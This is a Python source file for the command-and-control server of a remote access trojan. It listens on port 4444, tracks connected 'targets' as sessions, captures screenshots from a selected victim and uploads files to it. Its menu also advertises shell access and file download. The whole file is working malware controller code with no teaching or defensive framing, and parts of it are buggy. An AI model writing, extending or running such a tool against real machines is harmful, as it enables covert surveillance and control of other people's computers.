import os, socket, time, threading, sys
from queue import Queue
import tqdm

queue = Queue()
threads = 2
jobs = [1,2]

addresses = []
connections = []

selected_connection = None
selected_connection_id = -1

host = "192.168.15.108"
port = 4444
buffer_bytes = 1024

def decode_utf8(bytes):
    return bytes.decode("utf-8")
def remove_quotes(string):
    return string.replace("\"", "")
def send_data(data):
    selected_connection.send(data)
def receive_data(buffer):
    return selected_connection.recv(buffer)
def receive_all(buffer):
    byte_data = b""

    while True:
        byte_part = receive_data(buffer)
        if len(byte_part) == buffer:
            return byte_part
        byte_data += byte_part

        if len(byte_data) == buffer:
            return byte_data

def create_socket():
    global s
    try:
        s = socket.socket()
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    except socket.error() as e:
        print("Error creating the socket: ", str(e))
def socket_bind():
    global s
    try:
        print("Listening on port: ", str(port))
        s.bind((host, port))
        s.listen(20)
    except socket.error() as e:
        print("Error binding the socket: ", str(e))     
        socket_bind()   

def socket_accept():
    while True:
        try:
            conn, address = s.accept()
            conn.setblocking(1) # sem timeout
            connections.append(conn)
            client_info = decode_utf8(conn.recv(buffer_bytes)).split("',")
            client_info.append(address[0])
            client_info.append(address[1])
            addresses.append(client_info)
            print("\nConnection has been estabilished:", address[0])
        except socket.error:
            print("Error accepting connections")

def create_threads():
    for i in range(threads):
        thread = threading.Thread(target=work)
        thread.daemon = True
        thread.start()
    
    queue.join()

def menu_help():
    print("\n-h See all availabe commands")
    print("-l List all your open sessions")
    print("-x Kill all sessions")
    print("-i id Interact with a session" )
    print("")

def menu_command_options():
    print("\n-m Send message")
    print("-s Take a screenshot")
    print("-u Send File")
    print("-d Download File")
    print("-c Gain access to shell")
    print("-b Put the session in background")
    print("-h See all commands")

def select_connection(connection_id):
    global conn, selected_connection, selected_connection_id

    try:
        connection_id = int(connection_id)
        conn = connections[connection_id]
        print("Connecting to: ", addresses[connection_id][2], " - ", addresses[connection_id][0], addresses[connection_id][1])
        selected_connection = conn
        selected_connection_id = connection_id
    except:
        print("Invalid session!")
        return

def send_file():
    global selected_connection
    while True:
        file_directory = input('Type the file directory >> ')
        file_size = os.path.getsize(file_directory)

        if file_size > 0:
            break
        else:
            print("File not found!")
    
    splited_directory = file_directory.split("/")
    file_name = splited_directory[len(splited_directory)-1]
    send_data(f'upload-file {file_name}'.encode())

    progress = tqdm.tqdm(range(file_size), f"Sending {file_name}", unit="B", unit_scale=True, unit_divisor=1024)
    
    with open(file_directory, "rb") as f:
        while True:
            bytes_read = f.read(4096)
            if not bytes_read:
                break
            send_data(bytes_read)
            progress.update(len(bytes_read))
        
def receive_screenshot():
    global selected_connection

    selected_connection.send(str.encode("screenshot"))
    print("Taking a screenshot...")
    file_name = time.strftime("%Y%m%d%H%M%S" + ".png")
    picture = open(file_name, "wb")
    
    while True:
        response = receive_data(4096)
        try:
            if decode_utf8(response) == 'done':
                break
        except:
            picture.write(response)
            

    print("Receiving screenshot from now...")
    picture.close()

def interact():
    global selected_connection, selected_connection_id

    menu_command_options()
    while True:
        choice = input("\n>> ")
        if (choice == '-h'):
            menu_command_options()
        elif choice == '-b':
            print(f"Putting session {selected_connection_id} to sleep...")
            selected_connection = None
            selected_connection_id = -1
            return
        elif choice == '-s':
            receive_screenshot()
        elif choice == '-u':
            send_file()

def close():
    global connections, addresses

    if (len(addresses) == 0):
        return
    
    for counter, conn in enumerate(connections):
        conn.send(str.encode("exit"))
        conn.close()

    del connections
    del addresses
    connections = [] 
    addresses = []

def list_connections():
    if (len(addresses)) > 0:
        print("\nConnected targets: ")
        print("====================")
        print("")
        print("ID -  SESSION")
        for i, address in enumerate(addresses):
            print(i, " - ", address[2], " ", address[0], address[1])   
    else:
        print("No connections.")

def main_menu():

    while True:
        menu_help()
        choice = input("\n>> ")
        if (choice == "-l"):
            list_connections()
        elif (choice == "-h"):
            menu_help()
        elif (choice == "-x"):
            close()
            break
        elif (choice[:2] == "-i" and len(choice) > 2):
            select_connection(choice[3:])
            if (selected_connection is not None):
                interact()
        else:
            print("Invalid choice!")

def work():
    while True:
        value = queue.get()
        if value == 1:
            create_socket()
            socket_bind()
            socket_accept()
        elif value == 2:
            while True:
                time.sleep(0.2)
                if (len(addresses) > 0):
                    main_menu()
                    break
        queue.task_done()
        queue.task_done()
        sys.exit(0)


def create_jobs():
    for thread in jobs:
        queue.put(thread)
    queue.join()


create_threads()
create_jobs()
